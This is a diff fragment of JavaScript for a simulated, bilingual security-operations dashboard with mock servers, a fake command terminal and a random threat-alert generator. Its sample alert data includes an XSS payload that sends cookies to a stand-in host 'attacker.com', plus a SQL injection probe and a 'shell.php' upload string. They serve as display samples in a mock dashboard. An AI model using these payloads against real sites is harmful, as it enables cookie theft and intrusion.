+        }
+
+        function renderNodeDetails(nodeId) {
+            const server = state.servers[nodeId];
+            if (!server) return;
+
+            document.getElementById('diag-name').innerText = server.name;
+            document.getElementById('diag-ip').innerText = server.ip;
+            document.getElementById('diag-ping').innerText = `${server.ping}ms`;
+            document.getElementById('diag-cpu').innerText = `${server.load}%`;
+            document.getElementById('diag-os').innerText = server.system;
+            
+            const statusEl = document.getElementById('diag-status');
+            const t = vsocTranslations[currentLang];
+            
+            if (server.status === 'secure') {
+                statusEl.innerText = currentLang === 'es' ? "SEGURO" : "SECURE";
+                statusEl.className = "font-bold text-emerald-400";
+            } else if (server.status === 'shielded') {
+                statusEl.innerText = currentLang === 'es' ? "BLINDADO" : "SHIELDED";
+                statusEl.className = "font-bold text-blue-400";
+            } else if (server.status === 'compromised') {
+                statusEl.innerText = currentLang === 'es' ? "COMPROMETIDO" : "COMPROMISED";
+                statusEl.className = "font-bold text-red-500 animate-pulse";
+            }
+        }
+
+        function actionShieldSelected() {
+            if (!selectedNodeId) return;
+            shieldServer(selectedNodeId);
+        }
+
+        function actionRebootSelected() {
+            if (!selectedNodeId) return;
+            rebootServer(selectedNodeId);
+        }
+
+        function shieldServer(nodeId) {
+            const server = state.servers[nodeId];
+            const t = vsocTranslations[currentLang];
+
+            if (server.status === 'shielded' || server.shielded) {
+                playSound.error();
+                showTerminalOutput(`[!] Error: ${t.alreadyShielded.replace('{name}', server.name)}`, 'text-red-400');
+                return;
+            }
+
+            server.shielded = true;
+            server.status = 'shielded';
+            playSound.success();
+
+            // SVG elements styling updates
+            document.getElementById(`node-${nodeId}`).setAttribute('stroke', '#00f0ff');
+            document.getElementById(`status-${nodeId}`).setAttribute('fill', '#00f0ff');
+            document.getElementById(`shield-${nodeId}`).setAttribute('opacity', '1');
+            document.getElementById(`link-${nodeId}`).setAttribute('stroke', 'rgba(0, 240, 255, 0.4)');
+            
+            // Console print
+            showTerminalOutput(`>> EXECUTING: QuantumShield.deploy(${nodeId})`, 'text-blue-400');
+            showTerminalOutput(`[+] System: ${server.name} shielded successfully. Intrusion vulnerability dropped.`, 'text-emerald-400');
+            
+            if (selectedNodeId === nodeId) renderNodeDetails(nodeId);
+            
+            updateSummaryCounts();
+            recalcIntegrity();
+            renderActiveIncidentCards();
+
+            Swal.fire({
+                title: `<span class="text-blue-400 font-tech text-base">${t.shieldSuccessTitle}</span>`,
+                text: t.shieldSuccessText.replace('{name}', server.name),
+                icon: 'success',
+                background: 'rgba(13, 18, 34, 0.95)',
+                color: '#fff',
+                confirmButtonText: 'OK',
+                buttonsStyling: false,
+                customClass: {
+                    popup: 'vsoc-swal-popup',
+                    confirmButton: 'px-5 py-2 border border-blue-500 text-blue-400 rounded-lg hover:bg-blue-500 hover:text-white font-tech text-xs tracking-wider transition-all cursor-pointer bg-blue-500/10'
+                }
+            });
+        }
+
+        function rebootServer(nodeId) {
+            const server = state.servers[nodeId];
+            const t = vsocTranslations[currentLang];
+
+            if (server.status !== 'compromised') {
+                playSound.error();
+                showTerminalOutput(`[!] Error: ${t.notCompromised.replace('{name}', server.name)}`, 'text-orange-500');
+                return;
+            }
+
+            showTerminalOutput(`>> EXECUTING: ServerStack.rebootAndPurge(${nodeId})`, 'text-orange-500');
+            
+            let progress = 0;
+            const consoleLine = showTerminalOutput(`[ ] Purging Cache & Malware [                    ] 0%`, 'text-slate-300');
+            playSound.click();
+
+            const interval = setInterval(() => {
+                progress += 20;
+                let bars = '='.repeat(progress/10) + ' '.repeat(20 - progress/10);
+                consoleLine.innerText = `[ ] Purging Cache & Malware [${bars}] ${progress}%`;
+                playSound.keystroke();
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    server.status = 'secure';
+                    server.load = Math.floor(Math.random() * 10) + 5;
+                    playSound.success();
+
+                    // SVG Graphics restore
+                    document.getElementById(`node-${nodeId}`).setAttribute('stroke', '#22c55e');
+                    document.getElementById(`node-${nodeId}`).classList.remove('animate-pulse');
+                    document.getElementById(`status-${nodeId}`).setAttribute('fill', '#22c55e');
+                    document.getElementById(`link-${nodeId}`).setAttribute('stroke', 'rgba(59, 130, 246, 0.12)');
+                    
+                    showTerminalOutput(`[+] Success: Server ${server.name} reboot completed. Integrity restored.`, 'text-emerald-400');
+                    
+                    if (selectedNodeId === nodeId) renderNodeDetails(nodeId);
+                    
+                    // Resolve active incident representing this server state
+                    const inc = state.activeIncidents.find(i => i.nodeId === nodeId && i.status !== 'resolved');
+                    if (inc) {
+                        inc.status = 'resolved';
+                    }
+
+                    updateSummaryCounts();
+                    recalcIntegrity();
+                    renderActiveIncidentCards();
+
+                    Swal.fire({
+                        title: `<span class="text-emerald-400 font-tech text-base">${t.rebootSuccessTitle}</span>`,
+                        text: t.rebootSuccessText.replace('{name}', server.name),
+                        icon: 'success',
+                        background: 'rgba(13, 18, 34, 0.95)',
+                        color: '#fff',
+                        confirmButtonText: 'OK',
+                        buttonsStyling: false,
+                        customClass: {
+                            popup: 'vsoc-swal-popup',
+                            confirmButton: 'px-5 py-2 border border-emerald-500 text-emerald-400 rounded-lg hover:bg-emerald-500 hover:text-white font-tech text-xs tracking-wider transition-all cursor-pointer bg-emerald-500/10'
+                        }
+                    });
+                }
+            }, 300);
+        }
+
+        function updateSummaryCounts() {
+            let secure = 0;
+            let shielded = 0;
+            let compromised = 0;
+            let totalLoad = 0;
+
+            for(const key in state.servers) {
+                const s = state.servers[key];
+                totalLoad += s.load;
+                if(s.status === 'secure') secure++;
+                else if(s.status === 'shielded') shielded++;
+                else if(s.status === 'compromised') compromised++;
+            }
+
+            document.getElementById('summary-secure-count').innerText = secure;
+            document.getElementById('summary-shield-count').innerText = shielded;
+            document.getElementById('summary-alert-count').innerText = compromised;
+            document.getElementById('summary-avg-load').innerText = `${Math.floor(totalLoad / 5)}%`;
+
+            // Update Integration Indicators based on active security status
+            const integrations = ['siem', 'edr', 'fw', 'ids', 'intel', 'cloud'];
+            integrations.forEach(integration => {
+                const dot = document.getElementById(`status-${integration}-dot`);
+                const lbl = document.getElementById(`status-${integration}-lbl`);
+                if (compromised >= 3) {
+                    dot.className = "w-1.5 h-1.5 rounded-full bg-red-500 inline-block animate-pulse";
+                    lbl.innerText = currentLang === 'es' ? 'Alerta' : 'Alert';
+                    lbl.className = "text-[9px] text-red-500 font-bold leading-none";
+                } else if (compromised > 0) {
+                    dot.className = "w-1.5 h-1.5 rounded-full bg-orange-500 inline-block animate-pulse";
+                    lbl.innerText = currentLang === 'es' ? 'Precaución' : 'Warning';
+                    lbl.className = "text-[9px] text-orange-500 font-bold leading-none";
+                } else {
+                    dot.className = "w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block";
+                    lbl.innerText = currentLang === 'es' ? 'Conectado' : 'Connected';
+                    lbl.className = "text-[9px] text-emerald-400 font-semibold leading-none";
+                }
+            });
+        }
+
+        function recalcIntegrity() {
+            let health = 100.0;
+            let compromisedCount = 0;
+            for(const key in state.servers) {
+                if(state.servers[key].status === 'compromised') {
+                    health -= 20.0;
+                    compromisedCount++;
+                }
+            }
+            state.integrity = health;
+            
+            const integrityValEl = document.getElementById('integrity-value');
+            const defconEl = document.getElementById('defcon-value');
+            
+            integrityValEl.innerText = `${health.toFixed(1)}%`;
+
+            // Adjust sparklines dynamic point on integrity change
+            kpiSparkData.incidents.push(compromisedCount > 0 ? (compromisedCount * 25) : 5);
+            if (kpiSparkData.incidents.length > 7) kpiSparkData.incidents.shift();
+            drawSparkline('sparkline-incidents', kpiSparkData.incidents, '#c084fc');
+
+            // Style integrity color
+            if(health >= 80) {
+                integrityValEl.className = "text-base font-bold font-tech text-emerald-400";
+            } else if (health >= 50) {
+                integrityValEl.className = "text-base font-bold font-tech text-yellow-500";
+            } else {
+                integrityValEl.className = "text-base font-bold font-tech text-red-500 animate-pulse";
+            }
+
+            // Defcon status trigger
+            const t = vsocTranslations[currentLang];
+            if (compromisedCount >= 3) {
+                state.defcon = 1;
+                defconEl.innerText = "DEFCON 1 (CRITICAL)";
+                defconEl.className = "text-xs font-bold font-tech text-red-500 animate-pulse";
+                document.getElementById('alarmOverlay').className = "fixed inset-0 pointer-events-none z-10 transition-all duration-700 opacity-100 alarm-alert";
+            } else if (compromisedCount > 0) {
+                state.defcon = 2;
+                defconEl.innerText = "DEFCON 2";
+                defconEl.className = "text-xs font-bold font-tech text-orange-500 animate-pulse";
+                document.getElementById('alarmOverlay').className = "fixed inset-0 pointer-events-none z-10 transition-all duration-700 opacity-50 bg-red-600/5";
+            } else {
+                state.defcon = 4;
+                defconEl.innerText = "DEFCON 4";
+                defconEl.className = "text-xs font-bold font-tech text-blue-400";
+                document.getElementById('alarmOverlay').className = "fixed inset-0 pointer-events-none z-10 transition-all duration-700 opacity-0 bg-transparent";
+            }
+
+            // Sync with stats panel card values
+            document.getElementById('kpi-incidents-val').innerText = (compromisedCount + 3).toString(); // base 3 + compromised
+        }
+
+        // --- DYNAMIC CONTENT RENDERING ---
+
+        // Render recent alerts log table
+        function renderRecentAlertsTable() {
+            const tbody = document.getElementById('recent-alerts-tbody');
+            tbody.innerHTML = '';
+
+            state.recentAlerts.forEach((alert) => {
+                const tr = document.createElement('tr');
+                tr.className = "border-b border-slate-900/40 hover:bg-slate-900/30 transition-all";
+                
+                let sevBadgeClass = "text-yellow-500 bg-yellow-500/10 border border-yellow-500/20";
+                if(alert.severity === 'CRITICAL') sevBadgeClass = "text-red-500 bg-red-500/10 border border-red-500/20 font-bold";
+                else if(alert.severity === 'HIGH') sevBadgeClass = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
+
+                tr.innerHTML = `
+                    <td class="py-2.5 pr-2 text-slate-500">${alert.time}</td>
+                    <td class="py-2.5 px-2">
+                        <span class="px-2 py-0.5 rounded text-[9px] uppercase tracking-wide inline-block ${sevBadgeClass}">${currentLang === 'en' ? (alert.severity === 'CRITICAL' ? 'CRITICAL' : alert.severity) : (alert.severity === 'CRITICAL' ? 'CRÍTICA' : alert.severity)}</span>
+                    </td>
+                    <td class="py-2.5 px-2 text-slate-200">${alert.rule}</td>
+                    <td class="py-2.5 px-2 text-slate-400">${alert.source}</td>
+                    <td class="py-2.5 pl-2 text-slate-400">${alert.destination}</td>
+                `;
+
+                // Add popup forensics click handler
+                tr.addEventListener('click', () => {
+                    showForensicPopup(alert.source, alert.destination, alert.rule, alert.severity, alert.payload);
+                });
+
+                tbody.appendChild(tr);
+            });
+        }
+
+        // Render active incidents panel list
+        function renderActiveIncidentCards() {
+            const list = document.getElementById('active-incidents-list');
+            list.innerHTML = '';
+
+            // Filter out resolved incidents and display active ones
+            const activeIncidents = state.activeIncidents.filter(i => i.status !== 'resolved');
+
+            if(activeIncidents.length === 0) {
+                list.innerHTML = `
+                    <div class="h-full flex flex-col justify-center items-center text-center p-6 text-slate-500 font-mono text-xs">
+                        <i data-lucide="check-circle" class="w-6 h-6 text-emerald-400 mb-2"></i>
+                        <span>${currentLang === 'es' ? 'No hay incidentes activos' : 'No active incidents'}</span>
+                    </div>`;
+                lucide.createIcons();
+                return;
+            }
+
+            activeIncidents.forEach((inc) => {
+                const card = document.createElement('div');
+                
+                let borderClass = "border-slate-900 bg-slate-950/20 hover:border-slate-800";
+                let sevBadgeClass = "text-yellow-500 bg-yellow-500/15";
+                let statusColorClass = "text-blue-400 border-blue-400/20 bg-blue-500/5";
+
+                if (inc.severity === 'CRITICAL') {
+                    borderClass = "border-red-950/40 bg-red-950/5 hover:border-red-900/50 hover:bg-red-950/10";
+                    sevBadgeClass = "text-red-500 bg-red-500/15";
+                } else if (inc.severity === 'HIGH') {
+                    borderClass = "border-orange-950/40 bg-orange-950/5 hover:border-orange-900/50 hover:bg-orange-950/10";
+                    sevBadgeClass = "text-orange-500 bg-orange-500/15";
+                }
+
+                if (inc.status === 'analyzing') statusColorClass = "text-yellow-400 border-yellow-400/20 bg-yellow-500/5 animate-pulse";
+                else if (inc.status === 'containing') statusColorClass = "text-purple-400 border-purple-400/20 bg-purple-500/5 animate-pulse";
+                else if (inc.status === 'new') statusColorClass = "text-emerald-400 border-emerald-400/20 bg-emerald-500/5 animate-pulse";
+                else if (inc.status === 'investigating') statusColorClass = "text-blue-400 border-blue-400/20 bg-blue-500/5 animate-pulse";
+
+                const displaySeverity = currentLang === 'es' ? (inc.severity === 'CRITICAL' ? 'Crítica' : (inc.severity === 'HIGH' ? 'Alta' : 'Media')) : inc.severity;
+                
+                let displayStatus = inc.status.toUpperCase();
+                if(currentLang === 'es') {
+                    if (inc.status === 'investigating') displayStatus = 'En Investigación';
+                    else if (inc.status === 'analyzing') displayStatus = 'En Análisis';
+                    else if (inc.status === 'containing') displayStatus = 'En Contención';
+                    else if (inc.status === 'new') displayStatus = 'Nuevo';
+                } else {
+                    if (inc.status === 'investigating') displayStatus = 'Investigating';
+                    else if (inc.status === 'analyzing') displayStatus = 'Analyzing';
+                    else if (inc.status === 'containing') displayStatus = 'Containing';
+                    else if (inc.status === 'new') displayStatus = 'New';
+                }
+
+                card.className = `p-3 rounded-lg border flex justify-between items-start cursor-pointer transition-all ${borderClass}`;
+                card.innerHTML = `
+                    <div class="space-y-1 text-left min-w-0 pr-2">
+                        <div class="flex items-center gap-1.5">
+                            <span class="w-1.5 h-1.5 rounded-full ${inc.severity === 'CRITICAL' ? 'bg-red-500' : 'bg-orange-500'}"></span>
+                            <span class="font-bold text-white text-[10px] tracking-wide">${inc.id}</span>
+                        </div>
+                        <h4 class="font-semibold text-slate-200 text-[11px] leading-tight truncate">${inc.title}</h4>
+                        <div class="flex gap-1 pt-1.5">
+                            <span class="px-1.5 py-0.5 rounded text-[8px] font-bold ${sevBadgeClass}">${displaySeverity}</span>
+                            <span class="px-1.5 py-0.5 rounded text-[8px] font-bold border ${statusColorClass}">${displayStatus}</span>
+                        </div>
+                    </div>
+                    <span class="text-slate-500 text-[10px] shrink-0 font-mono">${inc.time}</span>
+                `;
+
+                // Remediate interactive popup
+                card.addEventListener('click', () => {
+                    showRemediationPopup(inc);
+                });
+
+                list.appendChild(card);
+            });
+        }
+
+        // Incident Remediation Action Modal
+        function showRemediationPopup(inc) {
+            playSound.click();
+            const server = state.servers[inc.nodeId];
+            const t = vsocTranslations[currentLang];
+
+            let htmlContent = `
+                <div class="text-left font-mono text-xs space-y-2 mt-2 leading-relaxed text-slate-300">
+                    <div><b>ID:</b> <span class="text-white">${inc.id}</span></div>
+                    <div><b>Server:</b> <span class="text-white">${server.name} (${server.ip})</span></div>
+                    <div><b>Vulnerability:</b> <span class="text-red-400 font-bold">${inc.title}</span></div>
+                    <div><b>OS:</b> <span class="text-slate-400">${server.system}</span></div>
+                    <div><b>CPU Load:</b> <span class="text-orange-500">${server.load}%</span></div>
+                </div>
+            `;
+
+            Swal.fire({
+                title: `<div class="font-tech text-sm tracking-wider text-red-500 flex items-center justify-center gap-2">
+                            <i data-lucide="shield-alert" class="w-5 h-5 animate-pulse"></i>
+                            <span>${currentLang === 'es' ? 'REMEDIACIÓN DE INCIDENTE' : 'INCIDENT REMEDIATION'}</span>
+                        </div>`,
+                html: htmlContent,
+                showCancelButton: true,
+                showDenyButton: true,
+                confirmButtonText: currentLang === 'es' ? 'Reiniciar Servidor' : 'Reboot Server',
+                denyButtonText: currentLang === 'es' ? 'Aplicar Escudo' : 'Deploy Shield',
+                cancelButtonText: t.forensicCancel,
+                buttonsStyling: false,
+                customClass: {
+                    popup: 'vsoc-swal-popup',
+                    confirmButton: 'px-4 py-2 border border-orange-500 bg-orange-500/10 text-orange-400 rounded-lg hover:bg-orange-500 hover:text-white font-tech text-xs tracking-wider transition-all cursor-pointer mr-2',
+                    denyButton: 'px-4 py-2 border border-blue-500 bg-blue-500/10 text-blue-400 rounded-lg hover:bg-blue-500 hover:text-white font-tech text-xs tracking-wider transition-all cursor-pointer mr-2',
+                    cancelButton: 'px-4 py-2 border border-slate-800 text-slate-400 rounded-lg hover:bg-slate-900 font-tech text-xs tracking-wider transition-all cursor-pointer'
+                },
+                didOpen: () => {
+                    lucide.createIcons();
+                }
+            }).then((res) => {
+                if (res.isConfirmed) {
+                    // Force state compromise check to allow reboot
+                    server.status = 'compromised';
+                    rebootServer(inc.nodeId);
+                } else if (res.isDenied) {
+                    shieldServer(inc.nodeId);
+                }
+            });
+        }
+
+        // News articles mock popups
+        function showNewsPopup(articleId) {
+            playSound.click();
+            const t = vsocTranslations[currentLang];
+            let title = '';
+            let content = '';
+
+            if (articleId === 1) {
+                title = currentLang === 'es' 
+                    ? "Nueva campaña de phishing apunta a usuarios de Microsoft 365"
+                    : "New phishing campaign targets Microsoft 365 users";
+                content = currentLang === 'es'
+                    ? `<p class='text-xs leading-relaxed text-slate-400'>
+                        Investigadores de seguridad han identificado una campaña de recolección de credenciales a gran escala que suplanta facturas de SharePoint y Teams. 
+                        Los atacantes utilizan dominios comprometidos para eludir pasarelas de correo y enlazan a páginas de login idénticas que roban credenciales y tokens de MFA. 
+                        <br><br><b>Recomendaciones:</b> Habilitar políticas de protección anti-phishing avanzada, capacitar operarios y vigilar inicios de sesión sospechosos.
+                       </p>`
+                    : `<p class='text-xs leading-relaxed text-slate-400'>
+                        Security researchers have identified a large-scale credential harvesting campaign spoofing SharePoint and Teams invoices. 
+                        Attackers use compromised domains to bypass email gateways and link to identical login pages that steal credentials and MFA tokens. 
+                        <br><br><b>Recommendations:</b> Enable advanced anti-phishing protection policies, train staff, and monitor suspicious logins.
+                       </p>`;
+            } else {
+                title = currentLang === 'es'
+                    ? "Vulnerabilidad crítica en productos de VMware"
+                    : "Critical vulnerability in VMware products";
+                content = currentLang === 'es'
+                    ? `<p class='text-xs leading-relaxed text-slate-400'>
+                        VMware ha lanzado parches de seguridad para resolver una falla crítica de ejecución remota de código (RCE) en vCenter Server. 
+                        Un atacante con acceso de red podría explotar esta vulnerabilidad enviando paquetes de red diseñados para ejecutar comandos arbitrarios con altos privilegios.
+                        <br><br><b>Recomendaciones:</b> Aplicar los parches del fabricante a la brevedad y restringir los puertos de administración perimetral.
+                       </p>`
+                    : `<p class='text-xs leading-relaxed text-slate-400'>
+                        VMware has released security patches addressing a critical remote code execution (RCE) vulnerability in vCenter Server. 
+                        An attacker with network access could exploit this flaw by sending crafted network packets to execute arbitrary commands with administrative privileges.
+                        <br><br><b>Recommendations:</b> Apply vendor patches immediately and restrict access to management ports on the perimeter.
+                       </p>`;
+            }
+
+            Swal.fire({
+                title: `<div class="font-tech text-sm tracking-wider text-blue-400 flex items-center justify-center gap-2">
+                            <i data-lucide="newspaper" class="w-5 h-5"></i>
+                            <span>${title}</span>
+                        </div>`,
+                html: content,
+                confirmButtonText: t.forensicCancel,
+                buttonsStyling: false,
+                customClass: {
+                    popup: 'vsoc-swal-popup',
+                    confirmButton: 'px-5 py-2 border border-slate-800 text-slate-400 hover:text-white rounded-lg font-tech text-xs tracking-wider transition-all cursor-pointer bg-slate-900/40'
+                },
+                didOpen: () => {
+                    lucide.createIcons();
+                }
+            });
+        }
+
+        // Forensic analysis details popup
+        function showForensicPopup(ip, nodeName, attackType, severity, payload) {
+            playSound.click();
+            const t = vsocTranslations[currentLang];
+            
+            let details = t.forensicDetails
+                .replace('{ip}', ip)
+                .replace('{node}', nodeName)
+                .replace('{type}', attackType)
+                .replace('{severity}', severity)
+                .replace('{payload}', payload);
+
+            Swal.fire({
+                title: `<div class="font-tech text-xs tracking-wider text-red-500 flex items-center justify-center gap-2">
+                            <i data-lucide="shield-alert" class="w-5 h-5 animate-pulse"></i>
+                            <span>${t.forensicTitle}</span>
+                        </div>`,
+                html: `<div class="text-left mt-2 text-xs leading-relaxed">${details}</div>`,
+                showCancelButton: true,
+                confirmButtonText: t.forensicConfirm,
+                cancelButtonText: t.forensicCancel,
+                buttonsStyling: false,
+                customClass: {
+                    popup: 'vsoc-swal-popup',
+                    confirmButton: 'px-4 py-2 border border-red-500 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500 hover:text-white font-tech text-xs tracking-wider transition-all cursor-pointer mr-2',
+                    cancelButton: 'px-4 py-2 border border-slate-800 text-slate-400 rounded-lg hover:bg-slate-900 font-tech text-xs tracking-wider transition-all cursor-pointer'
+                },
+                didOpen: () => {
+                    lucide.createIcons();
+                }
+            }).then((res) => {
+                if(res.isConfirmed) {
+                    state.blockedIps.add(ip);
+                    playSound.success();
+                    showTerminalOutput(`[+] Command Block executed: Blacklisted malicious client ${ip} via UI control.`, 'text-emerald-400');
+                    Swal.fire({
+                        icon: 'success',
+                        title: `<span class="text-emerald-400 font-tech text-sm">Firewall Blacklisted</span>`,
+                        text: t.ipBlockedSuccess.replace('{ip}', ip),
+                        background: 'rgba(13, 18, 34, 0.95)',
+                        color: '#fff',
+                        confirmButtonText: 'OK',
+                        buttonsStyling: false,
+                        customClass: {
+                            popup: 'vsoc-swal-popup',
+                            confirmButton: 'px-5 py-2 border border-blue-500 text-blue-400 rounded-lg hover:bg-blue-500 hover:text-white font-tech text-xs tracking-wider transition-all cursor-pointer bg-blue-500/10'
+                        }
+                    });
+                }
+            });
+        }
+
+
+        // --- CONSOLE INTERACTIVE TERMINAL ---
+        const consoleInput = document.getElementById('console-input');
+        const consoleOutput = document.getElementById('console-output');
+        const consoleScreen = document.getElementById('console-screen');
+
+        consoleInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const val = consoleInput.value.trim();
+                consoleInput.value = '';
+                if (val !== '') {
+                    processCommand(val);
+                }
+            } else {
+                playSound.keystroke();
+            }
+        });
+
+        // Let user focus terminal typing on box click
+        consoleScreen.addEventListener('click', () => {
+            consoleInput.focus();
+        });
+
+        function showTerminalOutput(text, colorClass = 'text-emerald-500') {
+            const line = document.createElement('div');
+            line.className = `leading-relaxed ${colorClass}`;
+            line.innerHTML = text;
+            consoleOutput.appendChild(line);
+            consoleScreen.scrollTop = consoleScreen.scrollHeight;
+            return line;
+        }
+
+        function processCommand(cmdString) {
+            showTerminalOutput(`<span class="text-blue-400">op@vsoc:~$</span> ${cmdString}`, 'text-slate-100');
+            
+            const parts = cmdString.toLowerCase().split(/\s+/);
+            const cmd = parts[0];
+            const arg = parts[1];
+            const t = vsocTranslations[currentLang];
+
+            switch(cmd) {
+                case 'help':
+                    playSound.click();
+                    showTerminalOutput(t.helpMenu, 'text-blue-400');
+                    break;
+                case 'status':
+                    playSound.click();
+                    showTerminalOutput(`[+] System Diagnostic Report:`, 'text-blue-400');
+                    for(const key in state.servers) {
+                        const s = state.servers[key];
+                        const statusColor = s.status === 'secure' ? 'text-emerald-400' : (s.status === 'shielded' ? 'text-blue-400' : 'text-red-500 font-bold animate-pulse');
+                        showTerminalOutput(`Node ID: <b class="text-white">${key}</b> | Name: ${s.name} | IP: ${s.ip} | Health: <span class="${statusColor}">${s.status.toUpperCase()}</span> | Load: ${s.load}%`, 'text-slate-400');
+                    }
+                    showTerminalOutput(`Firewall Blocked IPs count: ${state.blockedIps.size}`, 'text-slate-400');
+                    break;
+                case 'scan':
+                    playSound.click();
+                    showTerminalOutput(`>> EXECUTING: NetSecurity.vulnerabilityAssessment()`, 'text-orange-500');
+                    let p = 0;
+                    const cLine = showTerminalOutput(`[ ] Scanning nodes [                    ] 0%`, 'text-slate-300');
+                    const scanInterval = setInterval(() => {
+                        p += 10;
+                        let bars = '='.repeat(p/10) + ' '.repeat(20 - p/10);
+                        cLine.innerText = `[ ] Scanning nodes [${bars}] ${p}%`;
+                        playSound.keystroke();
+
+                        if (p >= 100) {
+                            clearInterval(scanInterval);
+                            playSound.success();
+                            cLine.innerText = `[+] Scanning nodes Completed. Scan finished.`;
+                            showTerminalOutput(`[+] Nodes scanned: 5 servers. Vulnerability factor: 0.00.`, 'text-emerald-400');
+                            
+                            let alertFound = false;
+                            for (const key in state.servers) {
+                                if (state.servers[key].status === 'compromised') {
+                                    alertFound = true;
+                                    showTerminalOutput(`[!] WARNING: Node '${key}' (${state.servers[key].name}) is COMPROMISED. Clean immediately!`, 'text-red-500');
+                                }
+                            }
+                            if (!alertFound) {
+                                showTerminalOutput(`[+] Status: Integrity score 100%. Grid fully protected.`, 'text-emerald-400');
+                            }
+                        }
+                    }, 120);
+                    break;
+                case 'shield':
+                    if (!arg) {
+                        playSound.error();
+                        showTerminalOutput(`[!] Error: Command shield requires a target node ID (e.g. shield api)`, 'text-red-500');
+                    } else if (!state.servers[arg]) {
+                        playSound.error();
+                        showTerminalOutput(`[!] Error: Node ID '${arg}' not found. Available IDs: api, auth, app, db, backup`, 'text-red-500');
+                    } else {
+                        shieldServer(arg);
+                    }
+                    break;
+                case 'reboot':
+                    if (!arg) {
+                        playSound.error();
+                        showTerminalOutput(`[!] Error: Command reboot requires a target node ID (e.g. reboot api)`, 'text-red-500');
+                    } else if (!state.servers[arg]) {
+                        playSound.error();
+                        showTerminalOutput(`[!] Error: Node ID '${arg}' not found. Available IDs: api, auth, app, db, backup`, 'text-red-500');
+                    } else {
+                        rebootServer(arg);
+                    }
+                    break;
+                case 'block':
+                    if (!arg) {
+                        playSound.error();
+                        showTerminalOutput(`[!] Error: Command block requires an IP address (e.g. block 192.168.1.10)`, 'text-red-500');
+                    } else {
+                        state.blockedIps.add(arg);
+                        playSound.success();
+                        showTerminalOutput(`[+] Success: Perimeter firewall blacklist updated. Blocked source IP: ${arg}`, 'text-emerald-400');
+                    }
+                    break;
+                case 'simulate':
+                case 'exploit':
+                    triggerIntrusion();
+                    break;
+                case 'clear':
+                    playSound.click();
+                    consoleOutput.innerHTML = '';
+                    break;
+                default:
+                    playSound.error();
+                    showTerminalOutput(`[!] Error: Command '${cmd}' not recognized. Type 'help' for support manual.`, 'text-red-500');
+            }
+        }
+
+
+        // --- THREAT SIMULATOR DATA GENERATION ---
+        const attackTypes = [
+            { type: "DDoS Flood Attack", severity: "HIGH", payload: "PACKET_SIZE=65535 FLAGS=SYN TIMEOUT=10ms" },
+            { type: "SQL Injection Probe", severity: "CRITICAL", payload: "GET /api/users?id=1%20UNION%20SELECT%20null,password" },
+            { type: "Brute Force SSH Attempt", severity: "HIGH", payload: "SSH_CONNECT: ROOT Login Trial #24 from unauthorized Node" },
+            { type: "Cross Site Scripting Exploit", severity: "MEDIUM", payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)" },
+            { type: "Port Scanning Activity", severity: "LOW", payload: "TCP SYN SCAN on ports: 21, 22, 80, 443, 8080" },
+            { type: "Malicious File Upload Payload", severity: "CRITICAL", payload: "POST /upload content-type: multipart/form-data filename: shell.php" }
+        ];
+
+        function getRandIp() {
+            return `${Math.floor(Math.random()*240)+12}.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}`;
+        }
+
+        // Generate alerts and logs periodically
+        function generateLog() {
+            const isAttack = Math.random() < 0.22; // 22% chance of attack line trigger
+            const threat = attackTypes[Math.floor(Math.random() * attackTypes.length)];
+            const ip = getRandIp();
+            
+            const serverKeys = Object.keys(state.servers);
+            const targetKey = serverKeys[Math.floor(Math.random() * serverKeys.length)];
+            const server = state.servers[targetKey];
+            
+            const time = new Date().toLocaleTimeString();
+
+            // Increment totals in stats
+            state.alerts.total++;
+            if (threat.severity === 'CRITICAL') {
+                state.alerts.critical++;
+                kpiSparkData.critical.push(kpiSparkData.critical[kpiSparkData.critical.length - 1] + 1);
+                kpiSparkData.critical.shift();
+            } else if (threat.severity === 'HIGH') {
+                state.alerts.high++;
+                kpiSparkData.high.push(kpiSparkData.high[kpiSparkData.high.length - 1] + 1);
+                kpiSparkData.high.shift();
+            } else if (threat.severity === 'MEDIUM') {
+                state.alerts.medium++;
+            } else if (threat.severity === 'LOW') {
+                state.alerts.low++;
+            } else {
+                state.alerts.informative++;
+            }
+
+            kpiSparkData.total.push(kpiSparkData.total[kpiSparkData.total.length - 1] + 1);
+            kpiSparkData.total.shift();
+
+            // Refresh cards & sparklines & charts
+            drawAllSparklines();
+            updateCharts();
+
+            // Push into Recent Alerts array
+            state.recentAlerts.unshift({
+                time: time,
+                severity: threat.severity,
+                rule: threat.type,
+                source: ip,
+                destination: server.ip,
+                payload: threat.payload
+            });
+
+            if(state.recentAlerts.length > 5) {
+                state.recentAlerts.pop();
+            }
+
+            renderRecentAlertsTable();
+
+            if(isAttack) {
+                simulateMapAttack(ip, targetKey, threat.type);
+            }
+        }
+
+        // Fire intrusion trigger (Mock attacker button)
+        function triggerIntrusion() {
+            playSound.alarm();
+            
+            // Pick a random uncompromised node
+            const nodes = Object.keys(state.servers);
+            const targets = nodes.filter(n => state.servers[n].status !== 'compromised');
+
+            if(targets.length === 0) {
+                playSound.error();
+                showTerminalOutput(`[!] CRITICAL: All node stacks have been compromised. Full cyber breach. Reboot system nodes immediately!`, 'text-red-500 animate-pulse');
+                return;
+            }
+
+            const targetKey = targets[Math.floor(Math.random() * targets.length)];
+            const targetServer = state.servers[targetKey];
+            const ip = getRandIp();
+            
+            showTerminalOutput(`[!] WARNING: HIGH SEVERITY ATTACK IN PROGRESS FROM ${ip} targeting ${targetServer.name}...`, 'text-red-500 animate-pulse');
+
+            // Send multiple quick attacks to Bogotá target
+            for (let i = 0; i < 4; i++) {
+                setTimeout(() => {
+                    simulateMapAttack(ip, targetKey, "Root Intrusion Override Exploit");
+                }, i * 200);
+            }
+        }
+
+
+        // --- MAP CANVAS RENDERER ---
+        const mapCanvas = document.getElementById('threatMapCanvas');
+        const mapCtx = mapCanvas.getContext('2d');
+        
+        let mapWidth = 0;
+        let mapHeight = 0;
+
+        function resizeMapCanvas() {
+            const rect = mapCanvas.parentNode.getBoundingClientRect();
+            mapCanvas.width = rect.width;
+            mapCanvas.height = rect.height;
+            mapWidth = mapCanvas.width;
+            mapHeight = mapCanvas.height;
+        }
+
+        // Continents normalized coordinate polygons representing landmass background
+        const continentPolys = [
